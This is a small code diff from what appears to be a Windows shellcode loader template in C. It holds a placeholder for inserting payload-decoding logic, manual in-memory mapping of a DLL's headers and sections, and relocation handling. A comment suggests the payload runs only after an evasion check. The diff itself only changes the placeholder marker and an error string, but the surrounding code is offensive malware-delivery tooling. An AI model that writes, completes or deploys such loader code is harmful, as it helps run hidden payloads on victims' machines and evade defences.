@@ -73,7 +73,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         // Execute payload if no money was spent
         // Step 0 : Decode the payload
         %SHELLCODE_DECODER% // Placeholder for shellcode decoding logic
-
+        /*-SHELLCODE_DECODER-*/
         // Step 1 : Get DLL's NT headers
 
         PIMAGE_NT_HEADERS64 dll_htHeaders = PE_getNtheaders(payload);
@@ -103,7 +103,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
             SIZE_T sectionSize = section[i].SizeOfRawData;
 
             if (!_WriteVirtMem((HANDLE)-1, sectionAddr, sectionData, sectionSize, NULL))
-                return 1;//"_WriteVirtMem() failed for section %s", section[i].Name);
+                return 1;//"_WriteVirtMem() failed");
         }
 
         // Step 5: Handle relocation if allocated at a different address
